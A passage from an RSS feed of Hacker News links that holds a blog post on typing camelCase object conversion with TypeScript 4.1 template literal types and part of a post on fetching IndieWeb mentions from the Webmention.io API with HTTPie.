<h2 id="The-limits-of-type-safety-in-TypeScript"><a href="#The-limits-of-type-safety-in-TypeScript" title="The limits of type safety in TypeScript"></a>The limits of type safety in TypeScript</h2><p>My standard example of a pattern you <em>couldn't</em> type has always been the <code>camelCase</code> function, which maps something like <code>"foo_bar"</code> → <code>"fooBar"</code>. It's easy to implement in JavaScript using a regular expression:</p>
<figure><div><pre><code><span><span>function</span> <span>camelCase</span>(<span>term</span>) </span>{<br>  <span>return</span> term.replace(<span>/_([a-z])/g</span>, <span><span>m</span> =&gt;</span> m[<span>1</span>].toUpperCase());<br>}<br></code></pre></div></figure>

<p>This function is trivial to <em>simply</em> type:</p>
<figure><div><pre><code><span>declare</span> <span><span>function</span> <span>camelCase</span>(<span>term: <span>string</span></span>): <span>string</span></span>;<br></code></pre></div></figure>

<p>So that's not quite what I'm getting at. Ideally you'd like to be able to use this to convert objects with <code>snake_cased</code> properties (like you'd get from a database) into one with <code>camelCased</code> properties (like you typically use in JS/TS). In other words, what should the return type of this function be to make the following code type check (or not) as you'd expect?</p>
<figure><div><pre><code><span><span>function</span> <span>objectToCamel</span>&lt;<span>T</span> <span>extends</span> <span>object</span>&gt;(<span>obj: T</span>) </span>{<br>  <span>const</span> out: <span>any</span> = {};<br>  <span>for</span> (<span>const</span> [k, v] of <span>Object</span>.entries(obj)) {<br>    out[camelCase(k)] = v;<br>  }<br>  <span>return</span> out;<br>}<p><span>const</span> snake = {foo_bar: <span>12</span>}; <br><span>const</span> camel = objectToCamel(snake);<br><br><span>const</span> val = camel.fooBar;  <br><span>const</span> val2 = camel.foo_bar;  </p></code></pre></div></figure>

<p>Prior to TypeScript 4.1 (now a release candidate) this just wasn't possible. The reason was that string literal types like <code>"foo_bar"</code> were "atomic" in the sense that you couldn't observe any structure inside of them. They were indivisible. But clearly there <em>is</em> structure in strings. Just look at <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Instance_methods" target="_blank" rel="noopener" onclick="return trackOutboundLink('the limits of type safety in typescript', 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Instance_methods', event);">all the methods</a> on <code>String.prototype</code>.</p>
<p>Enter: TypeScript 4.1!</p>
<h2 id="TypeScript-splits-the-atom"><a href="#TypeScript-splits-the-atom" title="TypeScript splits the atom"></a>TypeScript splits the atom</h2><p>TypeScript 4.1 introduce a few features that make it possible to precisely type the <code>objectToCamel</code> function:</p>
<ol>
<li><em>Template literal types</em> This is the key advance. Template literal types allow you to find structure inside string literal types and create infinite, strict subsets of <code>string</code> (think "strings starting with <code>on</code>").</li>
<li><em>Key Remapping in Mapped Types</em> While it was possible to change the keys in an object before using tricks like <a href="https://effectivetypescript.com/2020/05/12/unionize-objectify/">Unionize and Objectify</a>, this new feature makes it much more straightforward.</li>
</ol>
<p>Let's use these two features to implement <code>objectToCamel</code>.</p>
<p>First, let's look at template literal types. They look like ES template literals:</p>
<figure><div><pre><code><span>type</span> OnString = <span>`on<span>${<span>string</span>}</span>`</span>;<br><span>const</span> onClick: OnString = <span>'onClick'</span>;<br><span>const</span> handleClick: OnString = <span>'handleClick'</span>;<br>   <br></code></pre></div></figure>

<p>This lets you create a type for "strings starting with <code>on</code>." Before TypeScript 4.1, you either had <code>string</code> or an enumerated union of string literal types (<code>"a" | "b" | "c"</code>). Now you can define structured subsets of <code>string</code>.</p>
<p>Here are a few other patterns:</p>
<figure><div><pre><code><span>type</span> IdNum = <span>`id<span>${<span>number</span>}</span>`</span>;<br><span>const</span> id1: IdNum = <span>'id123'</span>;  <br><span>const</span> id2: IdNum = <span>'idABC'</span>;   <p><span>type</span> Digit = <span>'0'</span> | <span>'1'</span> | <span>'2'</span> | <span>'3'</span> | <span>'4'</span> |<br>             <span>'5'</span> | <span>'6'</span> | <span>'7'</span> | <span>'8'</span> | <span>'9'</span>;<br><span>type</span> ThreeDigitNum = <span>`<span>${Digit}</span><span>${Digit}</span><span>${Digit}</span>`</span>;</p></code></pre></div></figure>

<p>What makes this really powerful is that you can use the <a href="https://artsy.github.io/blog/2018/11/21/conditional-types-in-typescript/" target="_blank" rel="noopener" onclick="return trackOutboundLink('typescript splits the atom', 'https://artsy.github.io/blog/2018/11/21/conditional-types-in-typescript/', event);"><code>infer</code> keyword</a> in a template literal type to do pattern matching:</p>
<figure><div><pre><code><span>type</span> ToCamel1&lt;S <span>extends</span> <span>string</span>&gt; =<br>    S <span>extends</span> <span>`<span>${infer Head}</span>_<span>${infer Tail}</span>`</span><br>    ? <span>`<span>${Head}</span><span>${Capitalize&lt;Tail&gt;}</span>`</span><br>    : S;<p><span>type</span> T = ToCamel1&lt;<span>'foo_bar'</span>&gt;;  </p></code></pre></div></figure>

<p>The conditional matches string literal types of the form <code>"head_tail"</code>. The "<code>_</code>" acts as a delimiter to split the string. Because <a href="https://mariusschulz.com/blog/conditional-types-in-typescript#distributive-conditional-types" target="_blank" rel="noopener" onclick="return trackOutboundLink('typescript splits the atom', 'https://mariusschulz.com/blog/conditional-types-in-typescript#distributive-conditional-types', event);">conditional types distribute over unions</a>, this also works for union types:</p>
<figure><div><pre><code><span>type</span> TU = ToCamel1&lt;<span>'first_name'</span> | <span>'last_name'</span>&gt;;<br><br></code></pre></div></figure>

<p>There's a big issue, though. What if there's two <code>_</code>s in the string literal type?</p>
<figure><div><pre><code><span>type</span> T2 = ToCamel1&lt;<span>'foo_bar_baz'</span>&gt;;  <br></code></pre></div></figure>

<p>We can't stop after the first "<code>_</code>", we need to keep going. We can do this by making the type recursive:</p>
<figure><div><pre><code><span>type</span> ToCamel&lt;S <span>extends</span> <span>string</span>&gt; =<br>    S <span>extends</span> <span>`<span>${infer Head}</span>_<span>${infer Tail}</span>`</span><br>    ? <span>`<span>${Head}</span><span>${Capitalize&lt;ToCamel&lt;Tail&gt;&gt;}</span>`</span><br>    : S;<br><span>type</span> T0 = ToCamel&lt;<span>'foo'</span>&gt;;  <br><span>type</span> T1 = ToCamel&lt;<span>'foo_bar'</span>&gt;;  <br><span>type</span> T2 = ToCamel&lt;<span>'foo_bar_baz'</span>&gt;;  <br></code></pre></div></figure>

<p>The recursive bit is where we call <code>ToCamel&lt;Tail&gt;</code>.</p>
<p>Pretty neat! Now let's put it all together.</p>
<h2 id="A-typed-objectToCamel"><a href="#A-typed-objectToCamel" title="A typed objectToCamel"></a>A typed objectToCamel</h2><p>Recall that a <a href="https://medium.com/@danvdk/a-typed-pluck-exploring-typescript-2-1s-mapped-types-c15f72bf4ca8" target="_blank" rel="noopener" onclick="return trackOutboundLink('a typed objecttocamel', 'https://medium.com/@danvdk/a-typed-pluck-exploring-typescript-2-1s-mapped-types-c15f72bf4ca8', event);">mapped type</a> in TypeScript looks and works something like this:</p>
<figure><div><pre><code><span>interface</span> Vector {<br>  x: <span>number</span>;<br>  y: <span>number</span>;<br>}<br><span>type</span> Promisify&lt;T <span>extends</span> object&gt; = {<br>  [K <span>in</span> keyof T]: <span>Promise</span>&lt;T[K]&gt;  <br>};<br><span>type</span> VectorPromise = Promisify&lt;Vector&gt;;<br><br></code></pre></div></figure>

<p>The <code>keyof T</code> here produces a union of string literal types (<code>"x" | "y"</code>) and the mapped type produces an object type from this given a way to produce the values (the <code>Promise&lt;T[K]&gt;</code>). But the keys are set by the union. You can't change them.</p>
<p>With Key Remapping, you can add an <code>as</code> clause to the key in a mapped type to change things around. This works particularly well with template literal types:</p>
<figure><div><pre><code><span>interface</span> Student {<br>  name: <span>string</span>;<br>  age: <span>number</span>;<br>}<br><span>type</span> Evented&lt;T <span>extends</span> object&gt; = {<br>  [K <span>in</span> keyof T <span>as</span> <span>`<span>${K &amp; <span>string</span>}</span>Changed`</span>]: <span>(<span>val: T[K]</span>) =&gt;</span> <span>void</span>;<br>}<br><span>type</span> StudentEvents = Evented&lt;Student&gt;;<br><br><br><br><br></code></pre></div></figure>

<p>(The <code>&amp; string</code> is there for technical reasons that I don't want to get into.)</p>
<p>Using this, we can plug in our <code>ToCamel</code> generic to put it all together:</p>
<figure><div><pre><code><span>type</span> ObjectToCamel&lt;T <span>extends</span> object&gt; = {<br>  [K <span>in</span> keyof T <span>as</span> ToCamel&lt;K&gt;]: T[K]<br>};<p><span><span>function</span> <span>objectToCamel</span>&lt;<span>T</span> <span>extends</span> <span>object</span>&gt;(<span>obj: T</span>): <span>ObjectToCamel</span>&lt;<span>T</span>&gt; </span>{<br>  <br>}</p><p><span>const</span> snake = {foo_bar: <span>12</span>}; <br><span>const</span> camel = objectToCamel(snake);<br><br><span>const</span> val = camel.fooBar;  <br><span>const</span> val2 = camel.foo_bar;<br>                <br>                </p></code></pre></div></figure>

<p>Here's a <a href="https://www.typescriptlang.org/play?ts=4.2.0-dev.20201109#code/C4TwDgpgBAKg9gYQIYFsIBsA8BlKEAewEAdgCYDOU5wATgJbEDmAfFALwBQU3UuBRZSgAMAJAG8GAMwg0oACQhJSAXwD64qTNhI66ZUK48A-FFFiFS5eORg6wJOjoAvCJnjI0WGDvTNm+w24ALl4Abg5QSFgABnZYRFQMTABySTg4ZOZQ7gB6HKhI6DpKACI0uBKI8GgYAEY490SsVPTVACMkGkzsqDyC6qhiqDL0gCFOysLYACYGhM8U8vbO5adu3PypoZG4cZpxp0qOSQBXYgBjYDo4YihzpuRyVxg8QhIKKloGFgAKIhoUCEYABKIHzJIwVhiQw0CDAE40W7-FAAOlhYHQSHOEB+OVUPwA2kgALROAC6wJyjAANFAUOxWCgCbUySjgHAAKpgSA0R444HAqBISiNBaQ8LKDhVKIAeTaACsIJdRRDXgIPnAFUrgKw2FBodwCQBpQa3ADWEBAcEksCFIvBWBNADJPvQmMwyUDjWSOMpwsczpdrrdNYrlQ63Gr3pRQ9rmD9Q0DQVA5WHgCqvFDDOcbtQoHATsAQkhiCA4mI-YY0rIfjniHmCWbaQA3Mn5m2p7UokhfCDkBMKgX6wL5wsE+6ePk-M3Att65vhbiS7iw+GI0fACVSut5sDC+7octLDo0EK1aZ+3qbAZDMTHzohYgnFBtGSSnfAO5NOKx8MeDA-Hu5AHsC4R9FslBiFA5R7I+z6vrI765p+zYOHEE4YCiMGdD04E3pQT4vjIHAflAqHoLMeoYegWGtCei48IxTE8H0AB+7EcaxUAAAo0HAPKgFALRwMsXRQKQcB9lAxBwJ+BDFJ+Nz9JAI7McxfRqUJUHYae0nwTI2TKMkKJQAAInQpBQFaJx0ootzCXsyRGBwQA" target="_blank" rel="noopener" onclick="return trackOutboundLink('a typed objecttocamel', 'https://www.typescriptlang.org/play?ts=4.2.0-dev.20201109#code/C4TwDgpgBAKg9gYQIYFsIBsA8BlKEAewEAdgCYDOU5wATgJbEDmAfFALwBQU3UuBRZSgAMAJAG8GAMwg0oACQhJSAXwD64qTNhI66ZUK48A-FFFiFS5eORg6wJOjoAvCJnjI0WGDvTNm+w24ALl4Abg5QSFgABnZYRFQMTABySTg4ZOZQ7gB6HKhI6DpKACI0uBKI8GgYAEY490SsVPTVACMkGkzsqDyC6qhiqDL0gCFOysLYACYGhM8U8vbO5adu3PypoZG4cZpxp0qOSQBXYgBjYDo4YihzpuRyVxg8QhIKKloGFgAKIhoUCEYABKIHzJIwVhiQw0CDAE40W7-FAAOlhYHQSHOEB+OVUPwA2kgALROAC6wJyjAANFAUOxWCgCbUySjgHAAKpgSA0R444HAqBISiNBaQ8LKDhVKIAeTaACsIJdRRDXgIPnAFUrgKw2FBodwCQBpQa3ADWEBAcEksCFIvBWBNADJPvQmMwyUDjWSOMpwsczpdrrdNYrlQ63Gr3pRQ9rmD9Q0DQVA5WHgCqvFDDOcbtQoHATsAQkhiCA4mI-YY0rIfjniHmCWbaQA3Mn5m2p7UokhfCDkBMKgX6wL5wsE+6ePk-M3Att65vhbiS7iw+GI0fACVSut5sDC+7octLDo0EK1aZ+3qbAZDMTHzohYgnFBtGSSnfAO5NOKx8MeDA-Hu5AHsC4R9FslBiFA5R7I+z6vrI765p+zYOHEE4YCiMGdD04E3pQT4vjIHAflAqHoLMeoYegWGtCei48IxTE8H0AB+7EcaxUAAAo0HAPKgFALRwMsXRQKQcB9lAxBwJ+BDFJ+Nz9JAI7McxfRqUJUHYae0nwTI2TKMkKJQAAInQpBQFaJx0ootzCXsyRGBwQA', event);">complete playground</a>.</p>
<h2 id="What-can-should-you-do-with-template-literal-types"><a href="#What-can-should-you-do-with-template-literal-types" title="What can should you do with template literal types?"></a>What <del>can</del> should you do with template literal types?</h2><p>After template literal types landed, the TypeScript Twittersphere went crazy. I shared a use case around <a href="https://expressjs.com/en/guide/routing.html" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://expressjs.com/en/guide/routing.html', event);">express</a>, which quickly became the most popular tweet I've ever posted:</p>
<blockquote><p lang="en" dir="ltr">Another use of <a href="https://twitter.com/typescript?ref_src=twsrc%5Etfw" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://twitter.com/typescript?ref_src=twsrc%5Etfw', event);">@TypeScript</a> 4.1's template literal types: extracting the URL parameters from an express route. Pretty amazing you can do this in the type system! <a href="https://t.co/gfZQy70whg" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://t.co/gfZQy70whg', event);">https://t.co/gfZQy70whg</a> <a href="https://t.co/aEyfMwjjqX" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://t.co/aEyfMwjjqX', event);">pic.twitter.com/aEyfMwjjqX</a></p>— Dan Vanderkam (@danvdk) <a href="https://twitter.com/danvdk/status/1301707026507198464?ref_src=twsrc%5Etfw" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://twitter.com/danvdk/status/1301707026507198464?ref_src=twsrc%5Etfw', event);">September 4, 2020</a></blockquote> 

<p>A <a href="https://twitter.com/buildsghost/status/1301976526603206657" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://twitter.com/buildsghost/status/1301976526603206657', event);">JSON parser</a> made the rounds and then someone <a href="https://github.com/codemix/ts-sql" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/codemix/ts-sql', event);">implemented a full SQL engine</a> in the type system. Hacker news <a href="https://news.ycombinator.com/item?id=24615185" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://news.ycombinator.com/item?id=24615185', event);">was impressed</a>.</p>
<p>As with any new tool, it will take some time for the community to figure out the best ways to use it. Here are a few ideas. We'll see how they pan out!</p>
<ul>
<li><p>Dotted access: <strong>easy win</strong></p>
<p>Lodash allows you to write <a href="https://stackoverflow.com/a/43395675/388951" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://stackoverflow.com/a/43395675/388951', event);">"iteratee" expressions</a> like <code>xs.map('a.b.c')</code>, which is roughly the same as <code>xs.map(x =&gt; x.a.b.c)</code>. Template literal types will make it possible for this sort of API to be typed.</p>
<p>I've never been a big fan of this style. I'd prefer to write <code>x =&gt; x.a.b.c</code>. But perhaps some of this is just bias from not being able to type these properly in the past. Using string literals for enums, for example, is frowned upon in Java as unsafe, <a href="https://cocoacasts.com/the-danger-of-string-literals-and-stringly-typed-code" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://cocoacasts.com/the-danger-of-string-literals-and-stringly-typed-code', event);">stringly typed</a>, code. But it turns out to be fine in TypeScript because the type system is rich enough to capture it. So we'll see!</p>
</li>
<li><p>Parsing routes: <strong>huge win!</strong></p>
<p>See my tweet above. Parsing <code>{userId: string}</code> out of <code>/users/:userId</code> will be a big win for express users.</p>
<p>Going the other direction is also compelling. In a server I use at work, we issue API calls via something like <code>get('/users/:userId', {userId: 'id'})</code>. We have types defined for the parameters for each route. But now we can just let TypeScript infer them to ensure that nothing will ever get out of sync.</p>
<p>Similar considerations apply to routes with <a href="https://reactrouter.com/web/example/url-params" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://reactrouter.com/web/example/url-params', event);">react-router</a>.</p>
</li>
<li><p>Better types for <code>querySelector</code> / <code>querySelectorAll</code>: <strong>nice win</strong></p>
<p>The <a href="https://github.com/microsoft/TypeScript/blob/b5b0437a86661c8d7bc76c5860c07305df17899c/lib/lib.dom.d.ts#L11341-L11349" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/microsoft/TypeScript/blob/b5b0437a86661c8d7bc76c5860c07305df17899c/lib/lib.dom.d.ts#L11341-L11349', event);">DOM typings</a> are clever enough to infer a subtype of <code>Element</code> here:</p>
<figure><div><pre><code><span>const</span> input = <span>document</span>.queryQuerySelector(<span>'input'</span>);<br><br></code></pre></div></figure>

<p>But once you add anything more complex to the selector, you lose this:</p>
<figure><div><pre><code><span>const</span> input = <span>document</span>.queryQuerySelector(<span>'input.my-class'</span>);<br><br></code></pre></div></figure>

<p>With template literal types, it will be possible to fix this. I wouldn't be surprised if it becomes common practice to replace calls to <code>getElementById</code> with equivalent calls to <code>querySelector</code>:</p>
<figure><div><pre><code><span>const</span> el1 = <span>document</span>.getElementById(<span>'foo'</span>);<br><br><span>const</span> div = <span>document</span>.querySelector(<span>'div#foo'</span>);<br><br></code></pre></div></figure>

<p>This will no doubt require me to rewrite Item 55 of <a href="https://amzn.to/38s1oCK" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://amzn.to/38s1oCK', event);"><em>Effective TypeScript</em></a> ("Understand the DOM hierarchy"). Oh well!</p>
</li>
<li><p>Parsing options in <a href="https://www.npmjs.com/package/commander" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://www.npmjs.com/package/commander', event);">Commander</a> or <a href="https://github.com/docopt/docopt.coffee" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/docopt/docopt.coffee', event);">docopt</a>: <strong>a small win</strong></p>
<p>With <a href="https://www.npmjs.com/package/commander" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://www.npmjs.com/package/commander', event);">Commander</a>, you define your command line tool's arguments using something like this:</p>
<figure><div><pre><code>program<br>  .option(<span>'-d, --debug'</span>, <span>'output extra debugging'</span>)<br>  .option(<span>'-s, --small'</span>, <span>'small pizza size'</span>)<br>program.parse(process.argv);<br><span>console</span>.log(program.debug, program.small);<br></code></pre></div></figure>

<p>Setting aside the mutation style, which is hard to model in TypeScript, template literal types should make it possible to extract the parameter names from the calls to <code>.option</code>.</p>
</li>
<li><p>Parsing SQL or GraphQL: <strong>I could go either way!</strong></p>
<p>The <a href="https://github.com/codemix/ts-sql" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/codemix/ts-sql', event);">ts-sql</a> demo <a href="https://news.ycombinator.com/item?id=24615185" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://news.ycombinator.com/item?id=24615185', event);">raised some eyebrows</a>, but it also made a real point about the power of template literal types. Given a TypeScript version of your database schema (which can be generated using <a href="https://github.com/PSYT/schemats" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/PSYT/schemats', event);">schemats</a> or <a href="https://github.com/danvk/schemats" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/danvk/schemats', event);">pg-to-ts</a>), it should be possible to infer result types for a SQL query:</p>
<figure><div><pre><code><span>import</span> {Schema} <span>from</span> <span>'./dbschema'</span>;<p><span>async</span> <span><span>function</span> <span>getStudentsByAge</span>(<span>db: Pool, age: <span>number</span></span>) </span>{<br>  <span>const</span> result = <span>await</span> db.query&lt;Schema&gt;(<span>`</span><br><span>  SELECT first_name, last_name FROM students</span><br><span>  WHERE age = $1;</span><br><span>  `</span>, [age]);  <br>  <span>return</span> result.rows;<br>  <br>}</p></code></pre></div></figure>

<p>This seems potentially amazing, but also perhaps brittle. You'd have to work in the subset of SQL that your types understood: presumably you wouldn't want to implement all of <a href="https://en.wikipedia.org/wiki/PL/pgSQL" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://en.wikipedia.org/wiki/PL/pgSQL', event);">PL/pgSQL</a> in the type system. But I could imagine getting a large class of queries, including joins, to work.</p>
<p>So I'm on the fence on this one! Similar considerations apply to GraphQL queries, which would be a bit easier to join with a schema in the type system than raw SQL.</p>
</li>
</ul>
<p>Template literal types open up many new doors for TypeScript library authors and should improve the overall experience of using TypeScript for everyone by capturing more JavaScript patterns in the type system.</p>
<p>I'd like to conclude by pointing out that this is a very <em>TypeScripty</em> solution to this problem. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://effectivetypescript.com/2020/11/05/template-literal-types/">https://effectivetypescript.com/2020/11/05/template-literal-types/</a></em></p>]]>
            </description>
            <link>https://effectivetypescript.com/2020/11/05/template-literal-types/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059336</guid>
            <pubDate>Wed, 11 Nov 2020 15:52:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ZX Spectrum 8-Bit Chiptune Music Collection: AY-3-8910, Beeper, Digital]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059328">thread link</a>) | @elvis70
<br/>
November 11, 2020 | https://zxart.ee/eng/music/ | <a href="https://web.archive.org/web/*/https://zxart.ee/eng/music/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://zxart.ee/eng/music/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059328</guid>
            <pubDate>Wed, 11 Nov 2020 15:51:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using the Webmention.io API]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059318">thread link</a>) | @todsacerdoti
<br/>
November 11, 2020 | https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/ | <a href="https://web.archive.org/web/*/https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article>
    <header>
      <p>Fetching my IndieWeb mentions with HTTPie and Requests</p><section>
      <p><time datetime="2020-11-10T00:00:00+00:00">
            <a href="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/">
              Tuesday, 10 November, 2020
            </a>
          </time>— by
          <br>
        <a href="https://randomgeekery.org/post">Post</a>
        — <a href="https://randomgeekery.org/categories/tools/">Tools</a>
      
      
      
        —
        
          <a href="https://randomgeekery.org/tags/python">Python</a>
        
          <a href="https://randomgeekery.org/tags/indieweb">IndieWeb</a>
        
          <a href="https://randomgeekery.org/tags/fixing-my-site">fixing my site</a>
        
          <a href="https://randomgeekery.org/tags/site">Site</a>
        
      <br>
        Around 1,300 words, or 6 minutes of reading</p><section><p>Part 1 of 1 in the
              <a href="https://randomgeekery.org/series/fixing-my-webmentions">fixing my webmentions</a> series.</p>
          <dl></dl></section>
        

        
        
<nav>
  <section>
    <header>
      
      Previous Post
    </header>
    
      <p>
        <a href="https://randomgeekery.org/post/2020/07/tangling-code-from-hugo-content-with-raku/">Tangling code from Hugo content with Raku</a>
      </p>
      
    
  </section>
  <section>
    <header>
      Next Post
      
    </header>
    
      <p><em>You are reading the newest post</em></p>
    
  </section>
</nav>

      </section>
  
  
  
    
  

  <figure>
    <a href="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/cover.jpg">
      <img src="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/cover.jpg" alt="A spiderweb! For Webmention! Get it? Okay, yeah. Sorry.">
    </a><figcaption>A spiderweb! For Webmention! Get it? Okay, yeah. Sorry.</figcaption></figure>


    </header>
    <section>

      <p>So I hosed a local copy of my mentions feed the other month.
What’s my “mentions feed,” I hear you wondering?</p>
<p>Whenever somebody shares a reaction to something here — like, reshare, reply, mention — that reaction gets sent to <a href="https://webmention.io/">Webmention.io</a>.
There are more moving parts than that, of course.
<a href="https://brid.gy/">Bridgy</a> aggregates reactions to my announcement toots and tweets and sends those to Webmention.
It shows in my mentions feed as a reaction to site content when someone reacts to a relevant tweet.</p>
<p><em>Sometimes</em> folks even post mentions, replies, and reactions directly to the Webmention endpoint.
Mostly it’s just social media reactions, though.</p>
<p>The <a href="https://github.com/aaronpk/webmention.io#api">Webmention.io API</a> lets me gather all of these reactions.</p>
<p>Let’s acquaint ourselves with the important parts of this API.
You’ll need your API token, which can be found in the Webmention <a href="https://webmention.io/settings">Settings</a> once you sign up.</p>
<h2 id="reading-the-feed-with-httpie">Reading the feed with HTTPie</h2>
<p>I’ll use <a href="https://httpie.io/">HTTPie</a> for my little exploration.
I like the way it works.</p>
<h3 id="getting-recent-reactions">Getting recent reactions</h3>
<p>We mainly care about the mentions endpoint.
Hand it your domain and API token, and it will send you the 20 most recent responses for your site.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span>
</code></pre></div><p>HTTPie’s double-equals <code>==</code> syntax means “make a query string,” so I end up with something like this:</p>
<div><pre><code data-lang="text">https://webmention.io/api/mentions.jf2?domain=randomgeekery.org&amp;token=xxxxx
</code></pre></div><p>When <code>http</code> fetches that URL, I get back a <a href="https://www.w3.org/TR/jf2/">JF2</a> feed that looks something like this.</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>"Jumpei KAWAMI"</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>"https://webmention.io/avatar/…"</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>"https://twitter.com/junkw"</span>
            <span>},</span>
            <span>"content"</span><span>:</span> <span>{</span>
                <span>"text"</span><span>:</span> <span>"I wrote a note:\n\nI added this note from org mode…"</span>
            <span>},</span>
            <span>"published"</span><span>:</span> <span>"2020-10-25T23:32:25+00:00"</span><span>,</span>
            <span>"repost-of"</span><span>:</span> <span>"https://randomgeekery.org/note/2020/10/i-added-this-note-from-org-mode/"</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://twitter.com/junkw/status/1320508544601509889"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>887739</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"repost-of"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-10-26T04:07:20Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://brid-gy.appspot.com/repost/twitter/brianwisti/…"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org/note/2020/10/i-added-this-note-from-org-mode/"</span>
        <span>},</span>
        <span>⋮</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>What’s JF2?
It’s obviously JSON.
Maybe something to do with <a href="https://jsonfeed.org/">JSON Feed</a>?
Similar, but no.
JF2 is a JSON format for IndieWeb’s <a href="http://microformats.org/wiki/microformats2">microformats2</a>.
The mnemonic I’ve been trying to drill into my head is “JSON (micro)Formats 2.”</p>
<p>It’s not a very good mnemonic.</p>
<p>Each entry summarizes the reaction, including which of my posts they were reacting to.
That’s kind of important.
Most recently, Twitter user <a href="https://twitter.com/junkw">junkw</a> retweeted my announcement about <a href="https://randomgeekery.org/note/2020/10/i-added-this-note-from-org-mode/">adding a note from Org mode</a>.</p>
<div>
  <p>Note</p><p>

  There’s also a <code>.json</code> endpoint for every feed that presents a different structure for mentions.
I prefer it, because it contains fewer <code>wm-*</code> fields.
But the documentation uses JF2, so that’s what I’ll do.</p></div>

<h3 id="checking-for-new-reactions">Checking for new reactions</h3>
<p>Maybe I’m checking again later and only want to see the <em>new</em> reactions.
I request mentions received since the value of the <code>wm-received</code> field in the last entry I have.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>\
</span><span></span>  <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>\
</span><span></span>  <span>since</span><span>==</span><span>"2020-10-26T04:07:20Z"</span>
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>Well, yeah.
That makes sense.
I don’t get the kind of traffic where you’d expect fresh reactions every time you check.</p>
<h3 id="fetching-the-oldest-reactions-first">Fetching the oldest reactions first</h3>
<p>As I mentioned at the start, my site is a little broken.
I need to rebuild the full list of reactions so my <a href="https://randomgeekery.org/tags/hugo">Hugo</a> site can work with a complete record.
To do that, I should probably start from the oldest mentions and work my way forward.</p>
<p>Rather than the default <code>sort-dir</code> of <code>down</code>, I specify <code>up</code>.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>\
</span><span></span>  <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>\
</span><span></span>  sort-dir<span>==</span>up
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
